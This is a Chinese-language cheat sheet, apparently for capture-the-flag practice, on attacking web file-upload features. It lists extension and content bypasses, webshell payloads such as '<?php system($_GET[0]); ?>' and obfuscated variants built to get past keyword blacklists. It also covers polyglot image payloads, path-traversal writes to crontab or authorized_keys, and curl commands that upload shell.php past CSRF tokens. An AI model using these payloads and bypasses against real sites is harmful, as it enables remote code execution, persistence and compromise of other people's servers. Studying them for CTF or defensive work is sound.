# 文件上传

## 四个判定点（缺一不可）

1. **前端校验**：删掉 JS 直接发（几乎总是唯一校验就死在这）
2. **Content-Type**：`image/png` / `image/jpeg` 伪装
3. **后缀白名单**：看报错信息判断是黑名单还是白名单
4. **落点与可访问性**：上传到哪？目录能不能访问？会不会被重命名？

## 后缀绕过清单

```
.php .php3 .php4 .php5 .phtml .pht .phar .inc        # PHP
.jsp .jspx .jspf                                      # Java
.asp .aspx .ashx .asmx .cer .asa                      # ASP
.svg .html .htm .xhtml                                # 存储型 XSS / SSRF
shell.php.jpg      shell.php%00.jpg (PHP<5.3.4)
shell.php. .shell.php   shell.php::$DATA (Windows)
shell.pHp          shell.PhP5
```

## 内容绕过

- 图片马：`GIF89a` + `<?php ?>`，配合解析漏洞
- `.htaccess` / `web.config`：`AddType application/x-httpd-php .jpg`
- `.user.ini`：`auto_prepend_file=shell.jpg`
- 压缩包穿越：zip 内文件名 `../../shell.php`（Zip Slip）
- SVG：`<svg onload=...>` / SVG 里放 XXE

## 不是"上传 webshell"才有用

很多题的"上传"只用来**写任意文件到任意路径**（比 getshell 更直接）：

```
filename=../../../../tmp/x           # 路径穿越写文件
filename=/绝对路径/目标文件            # 直接覆盖（有权限时）
content 可控 + 路径可控 → 写 crontab / authorized_keys / .ssh / 站点配置
```

对象存储/序列化场景（`__destruct` 写文件、`storagePath` 可注入）也归这一类：
**找"写入路径"这个参数，就能写任意位置**。

## 上传之后

- 确认可访问：`GET /uploads/<name>`
- 不可访问：找解析入口（`?file=`、`?template=`、include、图片处理库）
- 有 WAF 拦命令执行：改用 `<?=` / `<?` 短标签、`$_GET[0]($_GET[1])`、无字母 webshell

## 多格式复合文件（polyglot）

当校验是「主格式合法 + 不含第二格式」，而下游又会把文件交给 PHP/浏览器/解压器时，
需要造一个**两个解析器都认**的文件。别手拼偏移和 CRC，用 `polyglot` 工具：

```json
{"carrier":"png","payload":"<?php system($_GET[0]); ?>","embed":"text","save_to":"/tmp/x.png"}
```

| carrier | embed=text（推荐） | embed=append |
|---|---|---|
| png | `tEXt` 块（结构最干净，图片仍可正常显示） | 文件尾追加 |
| gif | 注释扩展块 `21 FE len … 00` | 文件尾追加 |
| jpg | ——（JPEG 无通用注释块） | EOI 之后追加 |
| pdf | —— | `%%EOF` 之后追加 |

服务回 `clean file, no secondary format detected` = 第二格式不在它的扫描范围（换位置/换格式）；
回 `Polyglot detected!` = 过。

判断「藏哪儿」的经验：**扫描器看的是头部和已知区块，解释器看的是全文**。
所以要藏在「结构合法、但扫描器不解析」的地方（tEXt、注释、EOF 之后）。

## 带 CSRF 令牌的上传：两步走，且必须同一会话

后台的上传表单往往同时有隐藏的防伪令牌和文件域，顺序固定：

```bash
# 1) 登录并保留 cookie（-c 写、-b 读）
curl -s -c cj -X POST <login-url> -d 'user=..&pass=..'
# 2) 用同一 cookie 取上传页，抓令牌与字段名
curl -s -b cj <upload-url> | grep -oE 'name="[^"]+" value="[^"]+"'
# 3) 带同一 cookie + 令牌 + 文件域提交（文件名/类型都按原样给）
curl -s -b cj -F "<token-field>=<token>" -F "<file-field>=@shell.php;type=application/x-php" <upload-url>
```

- 字段名和令牌**必须从页面里抓**，不要猜；
- 令牌与会话绑定：换 cookie 会失效，`-b`/`-c` 要一路带着；
- `.php` 能直接执行时**不需要改名**，落点通常就是页面上提到的附件目录；
- 上传成功后先 `GET` 一次确认可访问，再谈"执行"（有的目录禁列但仍可直接访问文件）。

## 黑名单拦"标签/函数"时：换等价写法

- 黑名单常拦 `<?php`、`<?=`、`system`、`exec`、`eval`、`assert`、`popen`、`file_put_contents`、`include`；
- 但 **`<?` 短标签**经常不在名单里，且很多镜像 `short_open_tag=On`：
  `<? echo \`$_REQUEST[0]\`; ?>` 一样能执行；
- 函数名同理：反引号执行、`${_GET}[0]($_GET[1])`、`preg_replace` 的 `/e`（老版本）、
  变量函数 `$f='sys'.'tem'; $f($_GET[0]);`；
- 序列化/POP 链场景里，黑名单往往是**对整段 payload 做子串匹配**：
  属性名里带 `exec` 也会触发 → 换类/换属性名，或把字符串拆成拼接形式。

## 上传接口不一定非要"登录"

- 前端 JS 里出现 `X-API-Key` / `api_key` 表单字段时，**直接带 Key 打上传接口**，绕过"仅管理员"的前端限制；
- 判据：`/api/upload.php` 返回 401/403 时先看它要哪个头，而不是去找登录口。
